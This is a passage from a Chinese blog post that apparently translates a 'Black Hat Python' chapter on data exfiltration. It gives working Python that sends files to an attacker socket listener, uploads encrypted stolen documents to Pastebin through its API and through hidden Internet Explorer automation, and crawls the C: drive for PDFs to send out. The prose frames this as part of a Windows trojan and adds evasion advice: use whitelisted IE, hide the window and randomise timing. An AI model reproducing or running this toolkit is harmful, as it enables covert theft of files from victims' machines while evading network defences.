<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">transmit</span><span class="params">(document_path)</span>:</span></span><br><span class="line">    client = socket.socket()</span><br><span class="line">[<span class="number">1</span>] client.connect((<span class="string">'192.168.1.207'</span>, <span class="number">10000</span>))</span><br><span class="line">    <span class="keyword">with</span> open(document_path, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    [<span class="number">2</span>] win32file.TransmitFile(</span><br><span class="line">                client,</span><br><span class="line">                win32file._get_osfhandle(f.fileno()),</span><br><span class="line">                <span class="number">0</span>, <span class="number">0</span>, <span class="literal">None</span>, <span class="number">0</span>, <span class="string">b''</span>, <span class="string">b''</span>)</span><br></pre></td></tr></table></figure>

<p>正如我们在第2章中所做的，我们用我们选择的端口打开一个到在攻击者机器上的监听器的套接字；这里，我们使用端口10000 [1]。然后我们使用 <em>win32file.TransmitFile</em> 函数来传输文件[2]。</p>
<p>下面的主模块通过向监听机器传输一个文件(在本例中是 <em>mysecrets.txt</em> )来进行一个简单的测试:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    transmit(<span class="string">'./mysecrets.txt'</span>)</span><br></pre></td></tr></table></figure>

<p>一旦我们收到加密文件，我们就可以读取该文件来解密它。</p>
<h2 id="Web-服务器泄露数据"><a href="#Web-服务器泄露数据" class="headerlink" title="Web 服务器泄露数据"></a>Web 服务器泄露数据</h2><p>接下来，我们将编写一个新文件 <em>paste_exfil.py</em> ，通过发布到 web 服务器来发送我们的加密信息。我们将自动将加密文档发布到 <a href="https://pastebin.com/" target="_blank" rel="noopener">https://pastebin.com/</a> 上的帐户。这将使我们能够秘密传送文件，并且当我们需要的时候可以检索它，其他人都不能解密它。通过使用像 Pastebin 这样的知名网站，我们还应该能够绕过防火墙或代理可能有的任何黑名单，否则可能会阻止我们将文档发送到我们控制的 IP 地址或 web 服务器。让我们从将一些支持功能放入我们的泄露脚本开始。打开 <em>paste_exfil.py</em> 并输入以下代码:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">1</span>] <span class="keyword">from</span> win32com <span class="keyword">import</span> client</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">[<span class="number">2</span>] <span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">[<span class="number">3</span>] username = <span class="string">'tim'</span></span><br><span class="line">password = <span class="string">'seKret'</span></span><br><span class="line">api_dev_key = <span class="string">'cd3xxx001xxxx02'</span></span><br></pre></td></tr></table></figure>

<p>我们导入 <em>requests</em> 来处理跨平台的函数[2]，我们使用 <em>win32com</em> 的客户端类来处理特定于 Windows 的函数[1]。我们将向 <a href="https://pastebin.com/" target="_blank" rel="noopener">https://pastebin.com/</a> web服务器进行身份验证，并上传加密的字符串。为了进行身份验证，我们定义了 <em>username</em> 和 <em>password</em> 以及 <em>api_dev_key</em> [3]。</p>
<p>现在我们已经定义了导入和设置，让我们编写跨平台的函数 <em>plain_paste</em> :</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">1</span>] <span class="function"><span class="keyword">def</span> <span class="title">plain_paste</span><span class="params">(title, contents)</span>:</span></span><br><span class="line">    login_url = <span class="string">'https://pastebin.com/api/api_login.php'</span></span><br><span class="line">[<span class="number">2</span>] login_data = &#123;</span><br><span class="line">        <span class="string">'api_dev_key'</span>: api_dev_key,</span><br><span class="line">        <span class="string">'api_user_name'</span>: username,</span><br><span class="line">        <span class="string">'api_user_password'</span>: password,</span><br><span class="line">    &#125;</span><br><span class="line">    r = requests.post(login_url, data=login_data)</span><br><span class="line">[<span class="number">3</span>] api_user_key = r.text</span><br><span class="line">[<span class="number">4</span>] paste_url = <span class="string">'https://pastebin.com/api/api_post.php'</span></span><br><span class="line">    paste_data = &#123;</span><br><span class="line">        <span class="string">'api_paste_name'</span>: title,</span><br><span class="line">        <span class="string">'api_paste_code'</span>: contents.decode(),</span><br><span class="line">        <span class="string">'api_dev_key'</span>: api_dev_key,</span><br><span class="line">        <span class="string">'api_user_key'</span>: api_user_key,</span><br><span class="line">        <span class="string">'api_option'</span>: <span class="string">'paste'</span>,</span><br><span class="line">        <span class="string">'api_paste_private'</span>: <span class="number">0</span>,</span><br><span class="line">    &#125;</span><br><span class="line">[<span class="number">5</span>] r = requests.post(paste_url, data=paste_data)</span><br><span class="line">    print(r.status_code)</span><br><span class="line">    print(r.text)</span><br></pre></td></tr></table></figure>

<p>像前面的电子邮件函数一样， <em>plain_paste</em> 函数接收标题的文件名和加密内容作为参数[1]。您需要发出两个请求，才能在自己的用户名下创建复制件。首先，产生 <em>login</em> API 的 post 来提交数据，指定您的 <em>username</em> 、<em>api_dev_key</em> 和 <em>password</em> [2]。 post 的响应是你的 <em>api_user_key</em> 。你需要这些数据来创建你自己的用户名下的复制件[3]。第二个请求是 <em>post</em> API [4]。发送你的复制件名称(文件名是我们的标题)和内容，以及你的 <em>user</em> 和 <em>dev</em> API 密钥[5]。当该函数结束时，您应该能够在 <a href="https://pastebin.com/" target="_blank" rel="noopener">https://pastebin.com/</a> 上登录到您的帐户，并查看您的加密内容。您可以从仪表板下载复制件，以便解密。</p>
<p>接下来，我们将编写特定于 Windows 的技术，使用 Internet Explorer 执完成复制。 Internet Explorer, you say? (笔者注：IE浏览器一言难尽。)尽管其他浏览器，如 谷歌Chrome 、 微软Edge 和 Mozilla Firefox 最近更受欢迎，但许多企业环境仍然使用 Internet Explorer 浏览器作为默认浏览器。当然，对于 Windows 的许多版本来说，您不能从 Windows 系统中删除 Internet Explorer ，因此这种技术应该几乎总是适用于您的 Windows 特洛伊木马。</p>
<p>让我们看看如何利用 Internet Explorer 帮助从目标网络中提取信息。加拿大安全研究员卡里姆·纳特霍 (Karim Nathoo) 指出， Internet Explorer COM (Internet Explorer组件)自动化有一个极大的好处，那就是使用 <em>Iexplore.exe</em> 进程(通常该进程是受信任的和被列入白名单的)从网络中泄露信息。让我们从编写几个辅助函数开始:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">1</span>] <span class="function"><span class="keyword">def</span> <span class="title">wait_for_browser</span><span class="params">(browser)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> browser.ReadyState != <span class="number">4</span> <span class="keyword">and</span> browser.ReadyState != <span class="string">'complete'</span>:</span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line">[<span class="number">2</span>] <span class="function"><span class="keyword">def</span> <span class="title">random_sleep</span><span class="params">()</span>:</span></span><br><span class="line">    time.sleep(random.randint(<span class="number">5</span>,<span class="number">10</span>))</span><br></pre></td></tr></table></figure>

<p>第一个函数 <em>wait_for_browser</em> 确保浏览器已经完成了它的事件[1]，而第二个函数 <em>random_sleep</em> [2]使浏览器以某种稍微随机的方式运行，所以它看起来不像是程序行为。它会随机休眠一段时间；这是为了让浏览器执行可能没有向 Document Object Model (DOM，文档对象模型)注册事件的任务，以表明它们已经完成。这也让浏览器看起来更像人在操作一点。</p>
<p>现在我们有了这些辅助函数，让我们添加一些逻辑功能来处理登录和导航 Pastebin 仪表板。不幸的是，没有快速简单的方法可以在网络上找到 UI 元素(作者是花了30分钟使用 Firefox 及其开发工具来检查我们需要与之交互的每个 HTML 元素)。如果您希望使用不同的服务，那么您也必须弄清楚所需的精确时间、 DOM 交互和 HTML 元素——幸运的是， Python 使自动化变得非常容易。让我们添加一些代码:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(ie)</span>:</span></span><br><span class="line">[<span class="number">1</span>] full_doc = ie.Document.all</span><br><span class="line">    <span class="keyword">for</span> elem <span class="keyword">in</span> full_doc:</span><br><span class="line">    [<span class="number">2</span>] <span class="keyword">if</span> elem.id == <span class="string">'loginform-username'</span>:</span><br><span class="line">            elem.setAttribute(<span class="string">'value'</span>, username)</span><br><span class="line">        <span class="keyword">elif</span> elem.id == <span class="string">'loginform-password'</span>:</span><br><span class="line">            elem.setAttribute(<span class="string">'value'</span>, password)</span><br><span class="line">    random_sleep()</span><br><span class="line">    <span class="keyword">if</span> ie.Document.forms[<span class="number">0</span>].id == <span class="string">'w0'</span>:</span><br><span class="line">        ie.document.forms[<span class="number">0</span>].submit()</span><br><span class="line">    wait_for_browser(ie)</span><br></pre></td></tr></table></figure>

<p><em>login</em> 函数首先检索 DOM 中的所有元素[1]。它会查找用户名和密码字段[2]，并将它们设置为我们提供的凭据(不要忘记先注册帐户)。在这段代码执行之后，您应该登录到 Pastebin 仪表板，并准备复制一些信息。现在让我们添加代码:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">submit</span><span class="params">(ie, title, contents)</span>:</span></span><br><span class="line">    full_doc = ie.Document.all</span><br><span class="line">    <span class="keyword">for</span> elem <span class="keyword">in</span> full_doc:</span><br><span class="line">        <span class="keyword">if</span> elem.id == <span class="string">'postform-name'</span>:</span><br><span class="line">            elem.setAttribute(<span class="string">'value'</span>, title)</span><br><span class="line">        <span class="keyword">elif</span> elem.id == <span class="string">'postform-text'</span>:</span><br><span class="line">            elem.setAttribute(<span class="string">'value'</span>, contents)</span><br><span class="line">    <span class="keyword">if</span> ie.Document.forms[<span class="number">0</span>].id == <span class="string">'w0'</span>:</span><br><span class="line">        ie.document.forms[<span class="number">0</span>].submit()</span><br><span class="line">    random_sleep()</span><br><span class="line">    wait_for_browser(ie)</span><br></pre></td></tr></table></figure>

<p>在这一块上，这些代码应该看起来都不会很新。我们只是在 DOM 中搜索，寻找在哪里发布博客文章的标题和正文。 <em>submit</em> 函数接收浏览器的一个实例，以及要发送的文件名和加密文件内容。</p>
<p>现在我们可以登录并发布到 Pastebin ，让我们为我们的脚本做最后的润色:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ie_paste</span><span class="params">(title, contents)</span>:</span></span><br><span class="line">[<span class="number">1</span>] ie = client.Dispatch(<span class="string">'InternetExplorer.Application'</span>)</span><br><span class="line">[<span class="number">2</span>] ie.Visible = <span class="number">1</span></span><br><span class="line">    ie.Navigate(<span class="string">'https://pastebin.com/login'</span>)</span><br><span class="line">    wait_for_browser(ie)</span><br><span class="line">    login(ie)</span><br><span class="line">    ie.Navigate(<span class="string">'https://pastebin.com/'</span>)</span><br><span class="line">    wait_for_browser(ie)</span><br><span class="line">    submit(ie, title, contents.decode())</span><br><span class="line">[<span class="number">3</span>] ie.Quit()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    ie_paste(<span class="string">'title'</span>, <span class="string">'contents'</span>)</span><br></pre></td></tr></table></figure>

<p>我们需要调用 <em>ie_paste</em> 函数来处理我们想存储在 Pastebin 上的每个文档。它首先创建 Internet Explorer COM 对象的一个新实例[1]。有趣的是，你可以设置这个过程是否可见[2]。对于调试，可以将其设置为1，但是为了最大程度隐蔽行动，您肯定希望将其设置为0。例如，这一点在如果您的特洛伊木马检测到正在进行的其他活动时将非常有用；在这种情况下，您可以开始泄露文档，这可能有助于进一步将您的活动与用户的活动融合在一起。在我们调用所有的辅助函数之后，我们就消灭掉我们的 Internet Explorer 实例[3]并返回。</p>
<h2 id="把它们结合在一起"><a href="#把它们结合在一起" class="headerlink" title="把它们结合在一起"></a>把它们结合在一起</h2><p>最后，我们将泄露函数与 <em>exfil.py</em> 绑定在一起，我们可以使用刚刚编写的任意函数调用 <em>exfil.py</em> 文件来泄露文件:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">1</span>] <span class="keyword">from</span> cryptor <span class="keyword">import</span> encrypt, decrypt</span><br><span class="line"><span class="keyword">from</span> email_exfil <span class="keyword">import</span> outlook, plain_email</span><br><span class="line"><span class="keyword">from</span> transmit_exfil <span class="keyword">import</span> plain_ftp, transmit</span><br><span class="line"><span class="keyword">from</span> paste_exfil <span class="keyword">import</span> ie_paste, plain_paste</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">[<span class="number">2</span>] EXFIL = &#123;</span><br><span class="line">    <span class="string">'outlook'</span>: outlook,</span><br><span class="line">    <span class="string">'plain_email'</span>: plain_email,</span><br><span class="line">    <span class="string">'plain_ftp'</span>: plain_ftp,</span><br><span class="line">    <span class="string">'transmit'</span>: transmit,</span><br><span class="line">    <span class="string">'ie_paste'</span>: ie_paste,</span><br><span class="line">    <span class="string">'plain_paste'</span>: plain_paste,</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>首先，导入您刚刚编写的模块和函数[1]。然后，创建一个名为 <em>EXFIL</em> 的字典，其值对应于导入的函数[2]。这将使调用不同的泄露函数变得非常容易。这些值是函数的名称，因为在 Python 中，函数是可以用作参数。这种技术有时被称为 <em>dictionary dispatch</em> (字典调度)。它的工作原理很像其他语言中的 case 语句。</p>
<p>现在，我们需要创建一个函数来查找我们想要导出的文档:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_docs</span><span class="params">(doc_type=<span class="string">'.pdf'</span>)</span>:</span></span><br><span class="line">[<span class="number">1</span>] <span class="keyword">for</span> parent, _, filenames <span class="keyword">in</span> os.walk(<span class="string">'c:\\'</span>):</span><br><span class="line">        <span class="keyword">for</span> filename <span class="keyword">in</span> filenames:</span><br><span class="line">            <span class="keyword">if</span> filename.endswith(doc_type):</span><br><span class="line">                document_path = os.path.join(parent, filename)</span><br><span class="line">            [<span class="number">2</span>] <span class="keyword">yield</span> document_path</span><br></pre></td></tr></table></figure>

<p><em>find_docs</em> 函数遍历整个文件系统查找 PDF 文档[1]。它找到一个就返回该文档完整的路径，并将完成情况返回给调用者[2]。</p>
<p>接下来，我们创建主函数来协调泄露信息功能:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">1</span>] <span class="function"><span class="keyword">def</span> <span class="title">exfiltrate</span><span class="params">(document_path, method)</span>:</span></span><br><span class="line">[<span class="number">2</span>] <span class="keyword">if</span> method <span class="keyword">in</span> [<span class="string">'transmit'</span>, <span class="string">'plain_ftp'</span>]:</span><br><span class="line">        filename = <span class="string">f'c:\\windows\\temp\\<span class="subst">&#123;os.path.basename(document_path)&#125;</span>'</span></span><br><span class="line">        <span class="keyword">with</span> open(document_path, <span class="string">'rb'</span>) <span class="keyword">as</span> f0:</span><br><span class="line">            contents = f0.read()</span><br><span class="line">        <span class="keyword">with</span> open(filename, <span class="string">'wb'</span>) <span class="keyword">as</span> f1:</span><br><span class="line">            f1.write(encrypt(contents))</span><br><span class="line">    [<span class="number">3</span>] EXFIL[method](filename)</span><br><span class="line">        os.unlink(filename)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">    [<span class="number">4</span>] <span class="keyword">with</span> open(document_path, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            contents = f.read()</span><br><span class="line">        title = os.path.basename(document_path)</span><br><span class="line">        contents = encrypt(contents)</span><br><span class="line">    [<span class="number">5</span>] EXFIL[method](title, contents)</span><br></pre></td></tr></table></figure>

<p>我们将文档的路径和我们想要使用的泄露方法传递给 <em>exfiltrate</em> 函数[1]。当该方法涉及文件传输( <em>transmit</em> 或 <em>plain_ftp</em> )时，我们需要提供一个实际的文件，而不是一个编码的字符串。在这种情况下，我们从源文件中读入文件，加密内容，并将一个新文件写入临时目录[2]。我们用 <em>EXFIL</em> 字典来调度相应的方法，传入新的加密文档路径来泄露文件[3]，然后从临时目录中删除该文件。</p>
<p>对于其他方法，我们不需要编写新的文件；相反，我们只需要读取要泄露、窃取的文件[4]，加密其内容，并调用 <em>EXFIL</em> 字典来发送电子邮件或复制加密的信息[5]。</p>
<p>在主块中，我们遍历所有找到的文档。测试中我们通过 <em>plain_paste</em> 函数对它们进行泄露，您也可以选择我们定义的六个函数中的任何一个:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">for</span> fpath <span class="keyword">in</span> find_docs():</span><br><span class="line">        exfiltrate(fpath, <span class="string">'plain_paste'</span>)</span><br></pre></td></tr></table></figure>

<h3 id="Kicking-the-Tires"><a href="#Kicking-the-Tires" class="headerlink" title="Kicking the Tires"></a>Kicking the Tires</h3><p>这段代码有很多可移动的部分，但是这个工具很容易使用。只需从主机运行您的 <em>exfil.py</em> 脚本，并等待它通过电子邮件、 FTP 或 Pastebin 表示它已成功泄露文件。</p>
<p>如果你在运行 <em>paste_exfile.ie_paste</em> 函数时让 Internet Explorer 保持可见，你应该可以看到整个过程。完成后，您应该能够浏览到您的 Pastebin 页面，并看到类似图9-1的内容。</p>
<p><img src= "/img/loading.gif" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/image-20210720125947808.png" alt="image-20210720125947808"></p>
<p>完美！我们的 <em>exfil.py</em> 脚本提取了一个名为 <em>topo_post.pdf</em> 的PDF文档，对内容进行加密，然后将内容上传到 <em>pastebin.com</em> 。我们可以通过下载复制件并将其输入解密函数来成功解密文件，如下所示:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> cryptor <span class="keyword">import</span> decrypt</span><br><span class="line">[<span class="number">1</span>] <span class="keyword">with</span> open(<span class="string">'topo_post_pdf.txt'</span>, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    contents = f.read()</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'newtopo.pdf'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">[<span class="number">2</span>] f.write(decrypt(contents))</span><br></pre></td></tr></table></figure>

<p>这段代码打开下载的复制件文件[1]，解密内容，并将解密的内容写入新文件[2]。然后，您可以使用 PDF 阅读器打开新文件，以查看来自受害者机器的包含原始解密后地图的地形图。</p>
<p>现在，您的工具箱中有几个用于泄露数据信息的工具。您选择哪一个将取决于受害者网络的性质和该网络使用的安全防护级别。</p>
</div><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Ma9icCR</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://ma9iccr.github.io/2021-07/Black-Hat-Python-2nd-9/">https://ma9iccr.github.io/2021-07/Black-Hat-Python-2nd-9/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://ma9iccr.github.io" target="_blank">Ma9icCR</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Black-Hat-Python-2nd/">Black_Hat_Python_2nd</a></div><div class="post_share"><div class="social-share" data-image="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"/><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021-07/Black-Hat-Python-2nd-10/"><img class="prev-cover" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/BHP2nd.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Black Hat Python 2nd 10</div></div></a></div><div class="next-post pull-right"><a href="/2021-07/Black-Hat-Python-2nd-8/"><img class="next-cover" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/BHP2nd.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Black Hat Python 2nd 8</div></div></a></div></nav><div class="relatedPosts"><div class="relatedPosts_headline"><i class="fas fa-thumbs-up fa-fw"></i><span> 相关推荐</span></div><div class="relatedPosts_list"><div class="relatedPosts_item"><a href="/2021-07/Black-Hat-Python-2nd-11/" title="Black Hat Python 2nd 11"><img class="relatedPosts_cover" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/BHP2nd.jpg"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="far fa-calendar-alt fa-fw"></i> 2021-07-23</div><div class="relatedPosts_title">Black Hat Python 2nd 11</div></div></a></div><div class="relatedPosts_item"><a href="/2021-07/Black-Hat-Python-2nd-10/" title="Black Hat Python 2nd 10"><img class="relatedPosts_cover" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/BHP2nd.jpg"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="far fa-calendar-alt fa-fw"></i> 2021-07-20</div><div class="relatedPosts_title">Black Hat Python 2nd 10</div></div></a></div><div class="relatedPosts_item"><a href="/2021-07/Black-Hat-Python-2nd-8/" title="Black Hat Python 2nd 8"><img class="relatedPosts_cover" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/BHP2nd.jpg"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="far fa-calendar-alt fa-fw"></i> 2021-07-13</div><div class="relatedPosts_title">Black Hat Python 2nd 8</div></div></a></div><div class="relatedPosts_item"><a href="/2021-07/Black-Hat-Python-2nd-7/" title="Black Hat Python 2nd 7"><img class="relatedPosts_cover" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/BHP2nd.jpg"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="far fa-calendar-alt fa-fw"></i> 2021-07-08</div><div class="relatedPosts_title">Black Hat Python 2nd 7</div></div></a></div><div class="relatedPosts_item"><a href="/2021-07/Black-Hat-Python-2nd-6/" title="Black Hat Python 2nd 6"><img class="relatedPosts_cover" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/BHP2nd.jpg"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="far fa-calendar-alt fa-fw"></i> 2021-07-03</div><div class="relatedPosts_title">Black Hat Python 2nd 6</div></div></a></div><div class="relatedPosts_item"><a href="/2021-06/Black-Hat-Python-2nd-5/" title="Black Hat Python 2nd 5"><img class="relatedPosts_cover" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/BHP2nd.jpg"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="far fa-calendar-alt fa-fw"></i> 2021-06-28</div><div class="relatedPosts_title">Black Hat Python 2nd 5</div></div></a></div></div></div></article></main><footer id="footer" data-type="color"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By Ma9icCR</div><div class="framework-info"><span>驱动 </span><a href="https://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 </span><a href="https://github.com/jerryc127/hexo-theme-butterfly" target="_blank" rel="noopener"><span>Butterfly</span></a></div></div></footer></div><section id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="font_plus" type="button" title="放大字体"><i class="fas fa-plus"></i></button><button id="font_minus" type="button" title="缩小字体"><i class="fas fa-minus"></i></button><button id="translateLink" type="button" title="简繁转换">简</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></section><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script id="ribbon_piao" mobile="false" src="/js/third-party/piao.js"></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module" defer></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js" async></script></body></html>